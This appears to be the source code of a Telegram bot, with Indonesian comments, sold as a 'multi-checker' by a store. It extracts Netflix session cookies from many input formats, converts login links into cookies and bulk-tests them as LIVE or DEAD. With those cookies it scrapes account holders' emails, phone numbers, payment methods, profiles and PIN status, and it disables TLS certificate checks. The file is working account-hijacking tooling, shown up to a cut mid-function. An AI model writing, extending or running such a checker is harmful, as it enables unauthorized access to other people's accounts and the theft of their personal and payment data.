// Membaca file .env jika ada (jika tidak ada, ganti langsung token di bawah)
require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const AdmZip = require('adm-zip'); // Library untuk handle zip secara presisi
const bulkPlanCache = new Map(); // 🔥 CACHE SEMENTARA UNTUK FITUR BULK LINK
// --- INISIALISASI BOT & CACHE ---
const bulkLinkCache = new Map(); // 🔥 CACHE UNTUK MENGGABUNGKAN BULK LINK
const bot = new Telegraf(process.env.BOT_TOKEN); 
const tokenCache = new Map(); 
const activeConvertModes = new Map(); // 🔥 DATABASE SEMENTARA UNTUK MENGINGAT MODE USER
const lastBulkResults = new Map(); // 🌟 CACHE SEMENTARA HASIL BULK TERAKHIR PER USER UNTUK /satukan

// --- DATABASE & SETTING OWNER ---
const USER_DB_FILE = 'users.json'; 
const PEMBELI_DB_FILE = 'pembeli.json'; 
const OWNER_ID = 5420881452; 
const REQUIRED_CHANNEL = '@corvast'; 
// Fungsi jeda (Sleep/Delay) untuk mencegah IP terblokir karena spam request
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
// --- SETTING KANAL ARSIP OWNER ---
const LOG_CHANNEL_ID = '-1004431346293'; 
const REMINDER_CHANNEL_ID = '-1004488997480'; 

// --- FUNGSI PEMETAAN NEGARA & BENDERA LENGKAP GLOBAL ---
// --- FUNGSI PEMETAAN NEGARA & BENDERA LENGKAP GLOBAL ---
function getCountryDetail(countryCode) {
    if (!countryCode || countryCode === 'Not Detected') return { name: 'Not Detected', flag: '🏳️' };
    
    const code = countryCode.toUpperCase().trim();
    const countryMap = {
        // Asia
        'ID': { name: 'Indonesia', flag: '🇮🇩' },
        'SG': { name: 'Singapore', flag: '🇸🇬' },
        'MY': { name: 'Malaysia', flag: '🇲🇾' },
        'PH': { name: 'Philippines', flag: '🇵🇭' },
        'TH': { name: 'Thailand', flag: '🇹🇭' },
        'VN': { name: 'Vietnam', flag: '🇻🇳' },
        'MK': { name: 'North Macedonia', flag: '🇲🇰' },
        'ZM': { name: 'Zambia', flag: '🇿🇲' },
        'IN': { name: 'India', flag: '🇮🇳' },
        'JP': { name: 'Japan', flag: '🇯🇵' },
        'KR': { name: 'South Korea', flag: '🇰🇷' },
        'TW': { name: 'Taiwan', flag: '🇹🇼' },
        'HK': { name: 'Hong Kong', flag: '🇭🇰' },
        'CN': { name: 'China', flag: '🇨🇳' },
        'PK': { name: 'Pakistan', flag: '🇵🇰' },
        'BD': { name: 'Bangladesh', flag: '🇧🇩' },
        'LK': { name: 'Sri Lanka', flag: '🇱🇰' },
        'NP': { name: 'Nepal', flag: '🇳🇵' },
        'MM': { name: 'Myanmar', flag: '🇲🇲' },
        'KH': { name: 'Cambodia', flag: '🇰🇭' },
        'LA': { name: 'Laos', flag: '🇱🇦' },
        'BN': { name: 'Brunei', flag: '🇧🇳' },
        'MO': { name: 'Macau', flag: '🇲🇴' },
        
        // Americas
        'US': { name: 'United States', flag: '🇺🇸' },
        'CA': { name: 'Canada', flag: '🇨🇦' },
        'BR': { name: 'Brazil', flag: '🇧🇷' },
        'MX': { name: 'Mexico', flag: '🇲🇽' },
        'AR': { name: 'Argentina', flag: '🇦🇷' },
        'CO': { name: 'Colombia', flag: '🇨🇴' },
        'CL': { name: 'Chile', flag: '🇨🇱' },
        'PE': { name: 'Peru', flag: '🇵🇪' },
        'VE': { name: 'Venezuela', flag: '🇻🇪' },
        'EC': { name: 'Ecuador', flag: '🇪🇨' },
        'BO': { name: 'Bolivia', flag: '🇧🇴' },
        'PY': { name: 'Paraguay', flag: '🇵🇾' },
        'UY': { name: 'Uruguay', flag: '🇺🇾' },
        'CR': { name: 'Costa Rica', flag: '🇨🇷' },
        'PA': { name: 'Panama', flag: '🇵🇦' },
        'DO': { name: 'Dominican Republic', flag: '🇩🇴' },
        'GT': { name: 'Guatemala', flag: '🇬🇹' },
        'HN': { name: 'Honduras', flag: '🇭🇳' },
        'SV': { name: 'El Salvador', flag: '🇸🇻' },
        'NI': { name: 'Nicaragua', flag: '🇳🇮' },
        'PR': { name: 'Puerto Rico', flag: '🇵🇷' },
        'JM': { name: 'Jamaica', flag: '🇯🇲' },

        // Europe
        'GB': { name: 'United Kingdom', flag: '🇬🇧' },
        'DE': { name: 'Germany', flag: '🇩🇪' },
        'FR': { name: 'France', flag: '🇫🇷' },
        'IT': { name: 'Italy', flag: '🇮🇹' },
        'ES': { name: 'Spain', flag: '🇪🇸' },
        'NL': { name: 'Netherlands', flag: '🇳🇱' },
        'PL': { name: 'Poland', flag: '🇵🇱' },
        'RU': { name: 'Russia', flag: '🇷🇺' },
        'UA': { name: 'Ukraine', flag: '🇺🇦' },
        'SE': { name: 'Sweden', flag: '🇸🇪' },
        'NO': { name: 'Norway', flag: '🇳🇴' },
        'FI': { name: 'Finland', flag: '🇫🇮' },
        'DK': { name: 'Denmark', flag: '🇩🇰' },
        'IE': { name: 'Ireland', flag: '🇮🇪' },
        'CH': { name: 'Switzerland', flag: '🇨🇭' },
        'AT': { name: 'Austria', flag: '🇦🇹' },
        'BE': { name: 'Belgium', flag: '🇧🇪' },
        'PT': { name: 'Portugal', flag: '🇵🇹' },
        'GR': { name: 'Greece', flag: '🇬🇷' },
        'CZ': { name: 'Czech Republic', flag: '🇨🇿' },
        'HU': { name: 'Hungary', flag: '🇭🇺' },
        'RO': { name: 'Romania', flag: '🇷🇴' },
        'BG': { name: 'Bulgaria', flag: '🇧🇬' },
        'RS': { name: 'Serbia', flag: '🇷🇸' },
        'HR': { name: 'Croatia', flag: '🇭🇷' },
        'SK': { name: 'Slovakia', flag: '🇸🇰' },

        // Middle East & Africa
        'TR': { name: 'Turkey', flag: '🇹🇷' },
        'ZA': { name: 'South Africa', flag: '🇿🇦' },
        'AE': { name: 'United Arab Emirates', flag: '🇦🇪' },
        'SA': { name: 'Saudi Arabia', flag: '🇸🇦' },
        'EG': { name: 'Egypt', flag: '🇪🇬' },
        'NG': { name: 'Nigeria', flag: '🇳🇬' },
        'IL': { name: 'Israel', flag: '🇮🇱' },
        'QA': { name: 'Qatar', flag: '🇶🇦' },
        'KW': { name: 'Kuwait', flag: '🇰🇼' },
        'BH': { name: 'Bahrain', flag: '🇧🇭' },
        'OM': { name: 'Oman', flag: '🇴🇲' },
        'JO': { name: 'Jordan', flag: '🇯🇴' },
        'LB': { name: 'Lebanon', flag: '🇱🇧' },
        'MA': { name: 'Morocco', flag: '🇲🇦' },
        'DZ': { name: 'Algeria', flag: '🇩🇿' },
        'TN': { name: 'Tunisia', flag: '🇹🇳' },
        'KE': { name: 'Kenya', flag: '🇰🇪' },
        'GH': { name: 'Ghana', flag: '🇬🇭' },

        // Oceania
        'AU': { name: 'Australia', flag: '🇦🇺' },
        'NZ': { name: 'New Zealand', flag: '🇳🇿' },
        'FJ': { name: 'Fiji', flag: '🇫🇯' },
        'PG': { name: 'Papua New Guinea', flag: '🇵🇬' }
    };

    return countryMap[code] || { name: code, flag: '🏳️' };
}

// --- FUNGSI EKSTRAKSI LINK LOGIN DARI TEKS ---
function extractLinksFromText(text) {
    if (!text) return [];
    const urlRegex = /(https?:\/\/[^\s]+)/g;
    const matches = text.match(urlRegex) || [];
    return matches.filter(url => url.includes('nftoken=') || url.includes('LoginSecure'));
}

// --- FUNGSI RESOLVE LINK LOGIN MENJADI COOKIE MENTAH ---
async function resolveLinkToCookie(targetUrl) {
    try {
        let currentUrl = targetUrl;
        let netflixId = '', secureNetflixId = '', nfvdid = '';
        let combinedCookies = '';
        let attempt = 0;

        while (attempt < 5) {
            const response = await axios.get(currentUrl, {
                maxRedirects: 0,
                validateStatus: (status) => status >= 200 && status <= 302,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Cookie': combinedCookies 
                },
                timeout: 10000
            });

            const setCookieHeaders = response.headers['set-cookie'];
            if (setCookieHeaders) {
                setCookieHeaders.forEach(cookieStr => {
                    const cookiePart = cookieStr.split(';')[0];
                    const key = cookiePart.split('=')[0];
                    const val = cookiePart.substring(key.length + 1);

                    if (key === 'NetflixId') netflixId = val;
                    if (key === 'SecureNetflixId') secureNetflixId = val;
                    if (key === 'nfvdid') nfvdid = val;

                    combinedCookies += `${cookiePart}; `;
                });
            }

            if (response.status === 301 || response.status === 302) {
                currentUrl = response.headers.location;
                if (!currentUrl.startsWith('http')) {
                    currentUrl = `https://www.netflix.com${currentUrl}`;
                }
                attempt++;
            } else {
                break;
            }
        }

        if (netflixId && secureNetflixId) {
            return `NetflixId=${netflixId}; SecureNetflixId=${secureNetflixId}; ${nfvdid ? 'nfvdid=' + nfvdid + ';' : ''}`;
        }
        return null;
    } catch (error) {
        return null;
    }
}

// --- 1. JALANKAN BANNER DI AWAL ---
function showWelcomeBanner() {
    const cyan = "\x1b[36m";
    const red = "\x1b[31m";
    const bold = "\x1b[1m";
    const gray = "\x1b[90m";
    const green = "\x1b[32m";
    const reset = "\x1b[0m";

    console.log(`\n${red}${bold} █▀▀█ █▀▀▀ █▀▀█ █▀▀▀ ▀▀█▀▀ █▀▀█ █▀▀█ 
 █▄▄█ █─▀█ █▄▄█ ▀▀▀█ ──█── █▄▄▀ █▄▄█ 
 ▀──▀ ▀▀▀▀ ▀──▀ ▀▀▀▀ ──▀── ▀─▀▀ ▀──▀${reset}`);
    console.log(`${cyan}${bold} █▀▀▀ █─█ █▀▀▀ █▀▀▀ █─█ █▀▀▀ █▀▀█   
 █─── █▀█ █▀▀▀ █─── █▀▄ █▀▀▀ █▄▄▀ 
 ▀▀▀▀ ▀─▀ ▀▀▀▀ ▀▀▀▀ ▀─▀ ▀▀▀▀ ▀─▀▀ 
 ───────────────────────────────────${reset}`);
    console.log(`${cyan}${bold} WELCOME OWNER CORVAST STORE - WINDOWS LOCAL SYSTEM${reset}`);
    console.log(`${cyan}${bold}==================================================${reset}`);
    console.log(`${gray}[${new Date().toLocaleTimeString()}]${reset} Core system status: ${green}PREPARED (CMD MODE)${reset}`);
    console.log(`${gray}[${new Date().toLocaleTimeString()}]${reset} Connection: Secure Bypass Token Enabled`);
    console.log(`${gray}[${new Date().toLocaleTimeString()}]${reset} Polling: Local Telegram Listener Active`);
    console.log(`${cyan}${bold}--------------------------------------------------${reset}`);
    console.log(`🚀 \x1b[42m\x1b[30m SYSTEM ONLINE \x1b[0m Agastra VIP Multi-Checker is running on PC...\n`);
}

showWelcomeBanner();

// --- 2. TAMPILAN LOGGER PANEL ESTETIK ---
function logToPanel(type, data) {
    const magenta = "\x1b[35m";
    const cyan = "\x1b[36m";
    const green = "\x1b[32m";
    const yellow = "\x1b[33m";
    const bold = "\x1b[1m";
    const reset = "\x1b[0m";
    const time = new Date().toLocaleTimeString();

    if (type === 'SATUAN') {
        console.log(`${magenta}${bold}┌── [CONVERT SATUAN INDIVIDUAL] ───────────────────────────┐${reset}`);
        console.log(`${magenta}${bold}│${reset} ⏰ Time     : ${time}`);
        console.log(`${magenta}${bold}│${reset} 👤 User     : ${data.name} (${data.username})`);
        console.log(`${magenta}${bold}│${reset} 🆔 Telegram : ${data.id}`);
        console.log(`${magenta}${bold}│${reset} 📧 Account  : ${data.email}`);
        console.log(`${magenta}${bold}│${reset} 🌍 Country  : ${data.country} | 🌐 Lang: ${data.language}`);
        console.log(`${magenta}${bold}│${reset} ⚡ Speed    : ${green}${data.duration} detik${reset}`);
        console.log(`${magenta}${bold}└── [CORVAST LOG TRACKER SYSTEM] ──────────────────────────┘${reset}\n`);
    } else if (type === 'BULK') {
        console.log(`${cyan}${bold}┌── [BULK VERIFICATION MASSAL] ────────────────────────────┐${reset}`);
        console.log(`${cyan}${bold}│${reset} ⏰ Time     : ${time}`);
        console.log(`${cyan}${bold}│${reset} 👤 Operator : ${data.name} (${data.username})`);
        console.log(`${cyan}${bold}│${reset} 📦 Database : ${yellow}${data.fileName}${reset}`);
        console.log(`${cyan}${bold}│${reset} 📊 Total DB : ${data.total} Cookies`);
        console.log(`${cyan}${bold}│${reset} 🟢 Result   : ${green}${data.live} LIVE${reset} | 🔴 ${data.dead} DEAD`);
        console.log(`${cyan}${bold}└── [CORVAST LOG TRACKER SYSTEM] ──────────────────────────┘${reset}\n`);
    }
}

// --- 3. SISTEM DATABASE STRUKTUR ---
function loadUsers() {
    try {
        if (!fs.existsSync(USER_DB_FILE)) {
            fs.writeFileSync(USER_DB_FILE, JSON.stringify([], null, 2));
            return [];
        }
        const data = fs.readFileSync(USER_DB_FILE, 'utf8');
        let parsed = JSON.parse(data);
        if (Array.isArray(parsed) && parsed.length > 0 && typeof parsed[0] !== 'object') {
            parsed = parsed.map(id => ({ id: Number(id), username: 'User VIP', count: 0 }));
            fs.writeFileSync(USER_DB_FILE, JSON.stringify(parsed, null, 2));
        }
        return parsed;
    } catch (e) { return []; }
}

function saveUser(ctx, userId, username = 'User VIP') {
    let users = loadUsers();
    let userIndex = users.findIndex(u => u.id === userId);
    if (userIndex === -1) {
        users.push({ id: userId, username: username, count: 0 });
        fs.writeFileSync(USER_DB_FILE, JSON.stringify(users, null, 2));
        triggerAutoBackup(ctx, username, userId);
    } else if (username !== 'User VIP' && users[userIndex].username !== username) {
        users[userIndex].username = username;
        fs.writeFileSync(USER_DB_FILE, JSON.stringify(users, null, 2));
    }
}

async function triggerAutoBackup(ctx, newUsername, newUserId) {
    try {
        if (!fs.existsSync(USER_DB_FILE)) return;
        const totalUser = loadUsers().length;
        const captionBackup = `🔔 <b>AUTO BACKUP NOTIFICATION</b>\n──────────────────────────\n👤 <b>User Baru:</b> ${newUsername}\n🆔 <b>ID Telegram:</b> <code>${newUserId}</code>\n📊 <b>Total Database:</b> <code>${totalUser} User Terdaftar</code>\n──────────────────────────\n📌 <i>Berkas database users.json otomatis di-backup demi keamanan.</i>`;
        
        await ctx.telegram.sendDocument(OWNER_ID, { source: USER_DB_FILE }, { caption: captionBackup, parse_mode: 'HTML' });
    } catch (err) {
        console.error("⚠️ Gagal mengirim file auto-backup ke owner:", err.message);
    }
}

function loadPembeli() {
    try {
        if (!fs.existsSync(PEMBELI_DB_FILE)) {
            fs.writeFileSync(PEMBELI_DB_FILE, JSON.stringify([], null, 2));
            return [];
        }
        return JSON.parse(fs.readFileSync(PEMBELI_DB_FILE, 'utf8'));
    } catch (e) { return []; }
}

function savePembeli(pembeliList) {
    fs.writeFileSync(PEMBELI_DB_FILE, JSON.stringify(pembeliList, null, 2));
}

function addConvertScore(userId, totalPoints = 1) {
    let users = loadUsers();
    let userIndex = users.findIndex(u => u.id === userId);
    if (userIndex !== -1) {
        users[userIndex].count = (users[userIndex].count || 0) + totalPoints;
        fs.writeFileSync(USER_DB_FILE, JSON.stringify(users, null, 2));
    }
}

// --- KONSTANTA API NETFLIX ARGO ---
const ARGO_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
const ARGO_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.client.iosversion": "15.8.5",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.app-version": "15.48.1"
};
const httpsAgent = new https.Agent({ rejectUnauthorized: false });

// =========================================================================================
// --- UNIVERSAL ENGINE V5 (AUTO-SPACER UNTUK FORMAT COOKIES DEMPET / GLUED) ---
// =========================================================================================
function parseCookies(text) {
    let cookieDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
    if (!text || typeof text !== 'string') return cookieDict;

    let trimmed = text.trim();

    if (trimmed.startsWith('[') || trimmed.startsWith('{')) {
        try {
            const parsedJson = JSON.parse(trimmed);
            const deepSearch = (obj) => {
                if (!obj || typeof obj !== 'object') return;
                if (obj.name && obj.value !== undefined) {
                    if (obj.name === 'NetflixId') cookieDict['NetflixId'] = obj.value;
                    if (obj.name === 'SecureNetflixId') cookieDict['SecureNetflixId'] = obj.value;
                    if (obj.name === 'nfvdid') cookieDict['nfvdid'] = obj.value;
                }
                for (let key in obj) {
                    if (typeof obj[key] === 'object') deepSearch(obj[key]);
                }
            };
            deepSearch(parsedJson);
            if (cookieDict['NetflixId']) return cookieDict;
        } catch (e) {}
    }

    // 🌟 SMART SPACER: Mencegah error akibat cookie format "nempel" tanpa spasi
    let safeText = trimmed
        .replace(/(SecureNetflixId)/ig, ' $1')
        .replace(/(nfvdid)/ig, ' $1')
        .replace(/(NetflixId)/ig, ' $1');

    const targets = ['NetflixId', 'SecureNetflixId', 'nfvdid'];
    targets.forEach(target => {
        const globalRegex = new RegExp(`${target}[\\s:=]+([^;\\s\\}\\"\\|]+)`, 'i');
        const match = safeText.match(globalRegex);
        if (match && match[1]) {
            let value = match[1].trim();
            if (value.endsWith(',')) value = value.slice(0, -1);
            cookieDict[target] = value;
        }
    });

    return cookieDict;
}

function buildCookieString(cookieDict) {
    let cookies = [];
    if (cookieDict['NetflixId']) cookies.push(`NetflixId=${cookieDict['NetflixId']}`);
    if (cookieDict['SecureNetflixId']) cookies.push(`SecureNetflixId=${cookieDict['SecureNetflixId']}`);
    if (cookieDict['nfvdid']) cookies.push(`nfvdid=${cookieDict['nfvdid']}`);
    return cookies.join('; ');
}

function cleanCookieInput(text) {
    if (!text) return '';
    return text.replace(/&amp;/g, '&').replace(/\\"/g, '"').trim();
}

function extractCookiesFromRawText(fileContent) {
    let cookiesFound = [];
    if (!fileContent || typeof fileContent !== 'string') return cookiesFound;

    const trimmed = fileContent.trim();

    if (trimmed.startsWith('[') || trimmed.startsWith('{')) {
        try {
            const parsedJson = JSON.parse(trimmed);
            if (Array.isArray(parsedJson)) {
                parsedJson.forEach(item => {
                    if (item && typeof item === 'object') {
                        if (item.cookies && Array.isArray(item.cookies)) {
                            let tempDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
                            item.cookies.forEach(c => {
                                if (c.name === 'NetflixId') tempDict['NetflixId'] = c.value;
                                if (c.name === 'SecureNetflixId') tempDict['SecureNetflixId'] = c.value;
                                if (c.name === 'nfvdid') tempDict['nfvdid'] = c.value;
                            });
                            if (tempDict['NetflixId']) cookiesFound.push(buildCookieString(tempDict));
                        }
                    }
                });
            }
            if (cookiesFound.length > 0) return [...new Set(cookiesFound)];
            let finalDict = parseCookies(trimmed);
            if (finalDict['NetflixId']) return [buildCookieString(finalDict)];
        } catch (e) {}
    }

    const rawLines = fileContent.split(/\r?\n/);
    let currentDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
    let rawBufferJson = "";
    let insideJsonBlock = false;

    for (let line of rawLines) {
        let currentLine = line.trim();
        if (!currentLine || currentLine.startsWith('#')) continue;

        currentLine = currentLine.replace(/^\d+[\.\s\)]+\s*/, '');

        if (currentLine.includes('.netflix.com')) {
            let parts = currentLine.split(/\s+/);
            if (parts.length >= 6) {
                let name = parts[parts.length - 2];
                let value = parts[parts.length - 1];
                if (['NetflixId', 'SecureNetflixId', 'nfvdid'].includes(name)) {
                    if (currentDict[name] !== null) {
                        cookiesFound.push(buildCookieString(currentDict));
                        currentDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
                    }
                    currentDict[name] = value;
                }
            }
        } 
        else if (currentLine.match(/^(?:NetflixId|SecureNetflixId|nfvdid)[\s:=]+/i) || currentLine.includes('NetflixId') || currentLine.includes('SecureNetflixId')) {
            let tempDict = parseCookies(currentLine);
            
            if (tempDict['NetflixId'] && tempDict['SecureNetflixId']) {
                if (currentDict['NetflixId'] || currentDict['SecureNetflixId']) {
                    cookiesFound.push(buildCookieString(currentDict));
                    currentDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
                }
                cookiesFound.push(buildCookieString(tempDict));
                continue;
            }

            let conflict = false;
            if (tempDict['NetflixId'] && currentDict['NetflixId']) conflict = true;
            if (tempDict['SecureNetflixId'] && currentDict['SecureNetflixId']) conflict = true;
            if (tempDict['nfvdid'] && currentDict['nfvdid']) conflict = true;

            if (conflict) {
                cookiesFound.push(buildCookieString(currentDict));
                currentDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
            }

            if (tempDict['NetflixId']) currentDict['NetflixId'] = tempDict['NetflixId'];
            if (tempDict['SecureNetflixId']) currentDict['SecureNetflixId'] = tempDict['SecureNetflixId'];
            if (tempDict['nfvdid']) currentDict['nfvdid'] = tempDict['nfvdid'];
        } 
        else {
            if (currentLine.startsWith('{') || currentLine.includes('"name":')) insideJsonBlock = true;
            if (insideJsonBlock) {
                rawBufferJson += currentLine;
                if (currentLine.startsWith('}') || currentLine.endsWith('},') || currentLine.endsWith('}')) {
                    try {
                        const cleanSingleObj = rawBufferJson.endsWith(',') ? rawBufferJson.slice(0, -1) : rawBufferJson;
                        const parsedObj = JSON.parse(cleanSingleObj);
                        if (parsedObj.name && parsedObj.value) {
                            if (parsedObj.name === 'NetflixId') currentDict['NetflixId'] = parsedObj.value;
                            if (parsedObj.name === 'SecureNetflixId') currentDict['SecureNetflixId'] = parsedObj.value;
                            if (parsedObj.name === 'nfvdid') currentDict['nfvdid'] = parsedObj.value;
                            
                            if (currentDict['NetflixId'] && currentDict['SecureNetflixId']) {
                                cookiesFound.push(buildCookieString(currentDict));
                                currentDict = { 'NetflixId': null, 'SecureNetflixId': null, 'nfvdid': null };
                            }
                        }
                    } catch (err) {}
                    rawBufferJson = "";
                }
            }
        }
    }

    if (currentDict['NetflixId']) {
        cookiesFound.push(buildCookieString(currentDict));
    }

    if (cookiesFound.length === 0) {
        let fallbackDict = parseCookies(fileContent);
        if (fallbackDict['NetflixId']) cookiesFound.push(buildCookieString(fallbackDict)); 
    }

    return [...new Set(cookiesFound)];
}

function decodeHexEscapes(s) {
    if (!s) return s;
    return s.replace(/\\x([0-9A-Fa-f]{2})/g, (_, p1) => String.fromCharCode(parseInt(p1, 16)))
            .replace(/\\u([0-9A-Fa-f]{4})/g, (_, p1) => String.fromCharCode(parseInt(p1, 16)));
}

function parseTextData(text) {
    let data = { email: null, phone: null, plan: null, nextBill: null, extraMember: "No", region: null, payment: null, memberSince: null };
    const emailMatch = text.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/);
    if (emailMatch) data.email = emailMatch[1].trim();

    const phoneMatch = text.match(/(?:phoneNumber|Phone|Telepon|HP|phonenumber)\s*[:=]\s*([+\d]+)/i);
    if (phoneMatch) data.phone = phoneMatch[1].trim();

    if (text.includes('┃')) {
        const parts = text.split('┃').map(p => p.trim());
        if (parts[0] && !data.email) data.email = parts[0].replace(/^Form:\s*/i, '');
        if (parts[1] && !data.plan) data.plan = parts[1];
        if (parts[2] && !data.nextBill) data.nextBill = parts[2];
        if (parts[3]) data.extraMember = parts[3];
        if (parts[4] && !data.region) data.region = parts[4];
        if (parts[5] && !data.payment) data.payment = parts[5];
    }
    return data;
}

// --- 6. FUNGSI UTAMA SCRAPER INFO AKUN NETFLIX ---
async function checkAccountInfo(cookieString) {
    try {
        const startTimeFetch = Date.now();
        const headers = {
            'Cookie': cookieString,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8'
        };

        const response = await axios.get('https://www.netflix.com/YourAccount', { 
            headers, 
            timeout: 25000, 
            validateStatus: (status) => status >= 200 && status < 400,
            maxRedirects: 7
        });
        
        const html = response.data;
        if (!html || typeof html !== 'string') return { status: 'DEAD' };

        const isPageValid = html.includes('netflix.reactContext') || html.includes('MEMBER_HOVER') || html.includes('member-sign-out') || html.includes('header-id') || html.includes('profile-selector') || html.includes('avatar-wrapper') || html.includes('\"email\"') || html.includes('\"accountData\"');
        if (!isPageValid || response.status === 401) return { status: 'DEAD' };

        let plan = 'Not Detected', email = 'Not Detected', country = 'Not Detected';
        let payment = 'Not Detected', nextBill = 'Not Detected', memberSince = 'Not Detected';
        let language = 'Not Detected', extraMember = 'No', authURL = null;
        let profileNames = 'Not Detected', pinStatus = '-';
        let apiPhone = 'Tidak Terdeteksi';
        let holdPaymentStatus = "Aman (No Hold) 🟢";
        const reactContextMatch = html.match(/netflix\.reactContext\s*=\s*({.+?});<\/script>/) || html.match(/netflix\.reactContext\s*=\s*({.+?});/);
        if (reactContextMatch) {
            try {
                const cleanJson = decodeHexEscapes(reactContextMatch[1]);
                const context = JSON.parse(cleanJson);
                
                const acData = context?.models?.accountData?.data || context?.models?.memberHomeData?.data;
                const memberStatus = context?.models?.membershipStatus?.data || context?.models?.memberHomeData?.data?.membershipStatus || context?.models?.membershipState?.data;
                const bentoData = context?.models?.bento?.data || context?.models?.bentoAlerts?.data;
                
                // 🌟 DETEKSI HOLD MURNI VIA API/JSON STATUS
                if (memberStatus) {
                    if (
                        memberStatus.isHold === true || 
                        memberStatus.status === 'HOLD' || 
                        memberStatus.currentStatus === 'HOLD' || 
                        memberStatus.isInHold === true ||
                        memberStatus.isSuspended === true
                    ) {
                        holdPaymentStatus = "HOLD / SUSPENDED 🔴";
                    }
                }

                if (memberStatus?.isCancelled === true || memberStatus?.status === 'CANCELLED' || html.includes('"isCancelled":true')) {
                    holdPaymentStatus = "MEMBER CANCEL 🔴";
                }

                // 🌟 DETEKSI ALERT BENTO UNIVERSAL
                if (bentoData) {
                    const bentoString = JSON.stringify(bentoData).toUpperCase();
                    if (
                        bentoString.includes('PAYMENT_HOLD') || 
                        bentoString.includes('UPDATE_PAYMENT') ||
                        bentoString.includes('PAYMENT_FAILED') ||
                        bentoString.includes('PAYMENT_ERROR')
                    ) {
                        holdPaymentStatus = "HOLD / SUSPENDED 🔴";
                    }
                }
                
                // --- TAMBAHAN: Definisikan userInfo dan signupContext agar tidak error ---
                const userInfo = context?.models?.userInfo?.data;
                const signupContext = context?.models?.signupContext?.data;

                // --- Biarkan sisa kode scraping context (Profile, Email, Plan, dll) seperti aslinya ---
                let rawProfiles = context?.models?.userProfiles?.data || context?.models?.profiles?.data || context?.models?.profilesList?.data;
                if (!rawProfiles && userInfo?.profiles) rawProfiles = userInfo.profiles;
                if (!rawProfiles && acData?.profiles) rawProfiles = acData.profiles;

                if (Array.isArray(rawProfiles) && rawProfiles.length > 0) {
                    let namesArray = rawProfiles.map(p => {
                        if (typeof p === 'object') return p.profileName || p.rawTitle || p.firstName || p.name || p.title || '';
                        return p;
                    }).filter(name => name && name.trim() !== '' && !name.includes('{'));

                    if (namesArray.length > 0) profileNames = namesArray.join(', ');
                    const hasPin = rawProfiles.some(p => p.isLocked || p.isPinProtected || p.hasPin || p.pinProtected === true);
                    pinStatus = hasPin ? 'Protected 🔒' : 'Open 🔓';
                }

                if (signupContext) {
                    if (signupContext.currentPlan?.fields?.localizedPlanName?.value) plan = signupContext.currentPlan.fields.localizedPlanName.value;
                    if (signupContext.nextBillingDate?.value) nextBill = signupContext.nextBillingDate.value;
                    if (signupContext.memberSince?.value) {
                        const msTimestamp = signupContext.memberSince.value;
                        if (msTimestamp) memberSince = new Date(msTimestamp).toLocaleDateString('id-ID', { month: 'long', year: 'numeric' });
                    }
                    if (Array.isArray(signupContext.paymentMethods?.value) && signupContext.paymentMethods.value[0]) {
                        const pm = signupContext.paymentMethods.value[0].value;
                        payment = `${pm?.type?.value || 'CARD'} (${pm?.displayText?.value || ''})`.trim();
                    }
                }

                if (acData) {
                    email = acData.emailAddress || acData.email || email;
                    country = acData.countryOfSignup || acData.country || country;
                    if (plan === 'Not Detected') plan = acData.localizedPlanName?.value || plan;
                    if (nextBill === 'Not Detected') nextBill = acData.billingFormattedDate || acData.nextBillingDate || nextBill;
                    if (payment === 'Not Detected') payment = acData.paymentMethodDescription || acData.paymentMethodType || payment;
                    
                    if (acData.phoneNumber) apiPhone = typeof acData.phoneNumber === 'object' ? (acData.phoneNumber.value || 'Tidak Terdeteksi') : acData.phoneNumber;
                    if (acData.phone) apiPhone = typeof acData.phone === 'object' ? (acData.phone.value || 'Tidak Terdeteksi') : acData.phone;
                    if (acData.extraMembers || acData.hasExtraMembers || acData.extraMembersCount > 0) extraMember = 'Yes';
                }

                if (userInfo) {
                    email = userInfo.emailAddress || email;
                    if (userInfo.currentLocale) language = userInfo.currentLocale;
                }
                authURL = acData?.authURL || userInfo?.authURL || null;
            } catch (jsonErr) {}
        }

        if (email === 'Not Detected') {
            const emailMatch = html.match(/"emailAddress"\s*:\s*"([^"]+)"/) || html.match(/"email"\s*:\s*"([^"]+)"/);
            if (emailMatch) email = decodeHexEscapes(emailMatch[1]);
        }
        if (plan === 'Not Detected') {
            const planMatch = html.match(/"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/) || html.match(/"planName"\s*:\s*"([^"]+)"/);
            if (planMatch) plan = decodeHexEscapes(planMatch[1]);
        }
        if (country === 'Not Detected') {
            const countryMatch = html.match(/"countryOfSignup"\s*:\s*"([^"]+)"/) || html.match(/"countryCode"\s*:\s*"([^"]+)"/);
